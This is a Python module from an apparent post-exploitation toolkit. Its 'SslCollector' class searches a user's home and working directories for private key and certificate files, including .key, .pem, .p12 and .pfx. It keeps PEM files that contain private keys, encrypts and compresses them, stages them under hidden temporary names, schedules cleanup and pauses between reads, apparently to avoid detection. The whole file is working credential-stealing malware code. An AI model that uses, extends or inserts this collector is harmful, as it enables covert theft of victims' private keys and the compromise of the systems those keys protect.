from __future__ import annotations

import logging
import os
from pathlib import Path
from typing import Generator, Optional

from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollector, CollectedFile

_LOG = logging.getLogger(__name__)


class SslCollector(BaseCollector):
    """
    Collect SSL private keys from the filesystem.

    Targets:
      - *.key
      - *.pem (if contains PRIVATE KEY)
      - ~/.ssh/ (already covered by SshCollector, but this handles broader search)
    """

    def discover(self) -> Generator[ArtifactMetadata, None, None]:
        search_roots = [Path.home(), Path.cwd()]
        patterns = ["*.key", "*.pem", "*.p12", "*.pfx"]

        for root in search_roots:
            for p in patterns:
                for match in root.rglob(p):
                    if len(match.parts) - len(root.parts) > 3:
                        continue
                    yield ArtifactMetadata(
                        artifact_family="ssl_keys",
                        artifact_subtype=match.suffix.strip("."),
                        source_path=str(match),
                        source_platform=os.name,
                        collection_method="file_read",
                    )

    def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        try:
            path = Path(artifact.source_path)
            if not path.exists():
                return None

            data = path.read_bytes()
            # If it's a .pem, check if it's actually a private key
            if path.suffix == ".pem" and b"PRIVATE KEY" not in data:
                return None

            sha256 = self._sha256(data)
            payload = self._compress_and_encrypt(data)
            del data

            ext = artifact.artifact_subtype or "ssl"
            stage_path = self._staging_dir / f".{sha256[:16]}.{ext}.tmp"
            stage_path.write_bytes(payload)
            self._register_cleanup(stage_path)

            record = CollectedFile(
                path=str(path),
                sha256=sha256,
                size_bytes=len(payload),
                metadata=artifact,
            )
            self.persist_metadata(record)
            self._stagger_and_pause()
            return record

        except PermissionError:
            _LOG.debug("Permission denied: %s", artifact.source_path)
        except Exception as exc:
            _LOG.debug("SSL artifact collection error (%s): %s", artifact.source_path, exc)
        return None
